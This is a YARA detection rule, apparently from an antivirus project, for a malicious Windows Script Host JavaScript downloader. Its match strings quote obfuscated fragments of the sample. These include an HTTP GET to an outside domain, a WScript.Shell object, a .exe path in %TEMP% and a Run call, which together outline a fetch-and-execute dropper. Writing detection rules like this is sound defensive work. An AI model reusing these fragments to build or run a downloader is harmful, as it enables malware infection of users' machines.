rule sig_20160401_92ff6467e9358e9da0e8e75ef3dcad50 {
  meta:
    description = "datamaliciousorder - file 20160401_92ff6467e9358e9da0e8e75ef3dcad50.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fec40037773e4823339a835d8a7900cde574e3b502f50f4de69345cbbf4cffe2"

  strings:
    $s1  = "XiBaf[GvfKwi](\"G\" + \"ET\", \"http://xn--80ailp.com/q7usja\", false);" fullword ascii
    $s2  = "var WggDs = function AntXs() {return WScript[YbMqw](\"WScript\"+\".Shell\");}(), ZlVcj = 11;" fullword ascii
    $s3  = "function VoaBb(JwaQl, BghEp){OgyJxs = OgyJxs * 1; return JwaQl - BghEp;};" fullword ascii
    $s4  = "if (XiBaf[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function UucTz(){return SfjEyw + \"\";};" fullword ascii
    $s6  = "function JiUd() {return WggDs[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"2bRTisjV.ex\" + \"e\";};" fullword ascii
    $s7  = "function LeXl() {return ((YtsRlv == true) && (YtsRlv == UrpLn)) ? 1 : OgyJxs;};" fullword ascii
    $s8  = "function RvOkj(){return 23;};" fullword ascii
    $s9  = "var KuIb = new this[\"Date\"]();" fullword ascii
    $s10 = "var PldQv = false;" fullword ascii
    $s11 = "function XpiFx()" fullword ascii
    $s12 = "YtsRlv = true; " fullword ascii
    $s13 = "function YqaEfu(OfdAyo){WggDs[\"R\"+\"un\"](OfdAyo, OgyJxs, OgyJxs);};" fullword ascii
    $s14 = "function WeOs(VrQq) {var BjzUh = (1, 2, 3, 4, 5, VrQq); return BjzUh;};" fullword ascii
    $s15 = "UrpLn = true; " fullword ascii
    $s16 = "}while (VnbWfn);" fullword ascii
    $s17 = "function ZwMfx(){return YbMqw;};" fullword ascii
    $s18 = "return VoaBb(EjFk, OprId);" fullword ascii
    $s19 = "var YtsRlv = false;" fullword ascii
    $s20 = "var UrpLn = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}